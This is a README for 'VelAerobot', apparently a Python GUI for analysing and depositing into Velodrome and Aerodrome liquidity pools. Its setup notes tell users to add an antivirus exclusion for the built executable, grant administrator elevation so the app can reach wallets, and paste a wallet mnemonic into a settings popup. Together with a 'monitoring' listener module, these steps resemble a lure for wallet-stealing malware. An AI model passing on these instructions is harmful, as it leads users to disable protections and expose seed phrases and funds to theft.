# VelAerobot — Liquidity Pools Deposit Interface

![Python Version](https://img.shields.io/badge/python-3.12%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)

**VelAerobot** is a cross-platform Python desktop GUI for analyzing, filtering, and interacting with liquidity pools from **Velodrome** and **Aerodrome**. It goes beyond analytics by enabling **direct deposits** and **wallet interaction**, making it a powerful tool for DeFi liquidity providers.

* * *

## Project Structure

```
velaerobot/
├── assets/
├── libraries/
│   ├── chromium/
│   ├── inkscape/
├── monitoring/
│   ├── handler.py
│   ├── listener.py
│   └── sync.py
├── utils/
│   ├── coingecko.py
│   ├── converter.py
│   ├── ethereum.py
│   ├── models.py
│   ├── resolver.py
│   └── scaler.py
├── bundler.py
├── main.py
├── requirements.txt
└── README.md
```

* * *

## Features

* Cross-platform GUI built with **Tkinter**
* Live switch between **Velodrome** and **Aerodrome** pools
* Filter/sort pools by **APR**, **TVL**, **volume**, **fees**
* Visual indicators for **pool scoring** and **risk levels**
* Secure wallet interaction for **direct deposits**
* Built-in **real-time sync monitor**
* SQLite-based local database with SQLAlchemy ORM
* Pool metadata from **Coingecko** and **on-chain**

* * *

## Getting Started

### 1. Install Dependencies

```bash
pip install -r requirements.txt
```

### 2. Launch the App

```bash
python main.py
```

This will open the VelAerobot GUI. From here, you can configure your wallet, browse liquidity pools, and interact with them directly.

* * *

## Build Executable (Optional)

To build a standalone executable:

```bash
pyinstaller bundler.py
```

This will generate an executable file in the `dist/` folder.

* * *

### Important Notes After Build

After generating the executable:

* **Move the built `.exe` into a dedicated folder**.
* **Create an exclusion rule in your antivirus (AV)** to prevent false positives or blocking issues due to wallet interaction and data monitoring.

* * *

### Administrator Privileges Required

This application requires administrator privileges to function properly.

When you start the program, a **Windows security prompt (UAC)** will appear asking for permission to elevate the application. You **must accept** this prompt by clicking **"Yes"** to continue.

If you **cancel or deny** the prompt:

* The application will not be able to proceed.
* You will see a message explaining that elevation was canceled.
* You must **restart the app** and allow elevation to use it.

This elevation is necessary to:

* Access protected resources (e.g., wallets, configuration paths)
* Write secure files or perform system-level operations

* * *

### Pool Metrics & Scoring

Each pool card includes:

* Pair name & network
* Fee tier
* TVL, Fees, Volume (headlines + breakdown)
* APR
* A color-coded score badge:
  * Green: Safe / High-performance
  * Yellow: Medium
  * Red: Low/volatile

* * *

### Filters & Search

* Pool type: Basic, Concentrated, Stable, Volatile
* Sort by: APR or Low TVL
* Network dropdown (per protocol)
* Live keyword search: token symbols or contract address
* Reset filters in one click

* * *

### Deposit Workflow

Every pool card includes a **"+ New Deposit"** button.

* Opens a centered popup
* Allows ETH injection input
* Submit button designed to plug into
  * A backend wallet interface
  * Web3.py, RPC node, or Phantom integration (future)

**Current behavior:** UI-level input only
**Future-ready:** Attach actual wallet logic to process deposits

* * *

### Wallet Settings

Via **Settings** popup:

* Set minimum wallet balance
* Paste wallet mnemonic (placeholder only for now)
* Designed to integrate with
  * Signing utilities
  * Wallet recovery
  * Deposit transaction generation

* * *

### Sync System

* On launch, the app uses `SyncHandler` to check if `pools.db` is older than `maxseconds`
* If sync is needed
  * Opens modal `SyncPopup` with progress
  * After sync → launches app
* If no sync is needed:
  * App opens immediately

* * *

### Roadmap Ideas

| Feature                              | Status         |
|--------------------------------------|----------------|
| APR / TVL charts                     | Planned        |
| Transaction signing (ETH/SOL)        | In design      |
| Phantom / MetaMask integration       | Future         |
| Multi-wallet support                 | Future         |
| Export data (CSV/JSON)               | Done           |
| Deposit history tracking             | Planned        |

* * *

## Contributing

Contributions are welcome! Please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/your-feature`).
3. Make your changes and commit them (`git commit -m "Add your feature"`).
4. Push to your branch (`git push origin feature/your-feature`).
5. Open a pull request with a clear description of your changes.

Ensure your code follows PEP 8 style guidelines and includes appropriate tests.

* * *

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

* * *

## Contact

For any issues, suggestions, or questions regarding the project, please open a new issue on the official GitHub repository or reach out directly to the maintainer through the [GitHub Issues](issues) page for further assistance and follow-up.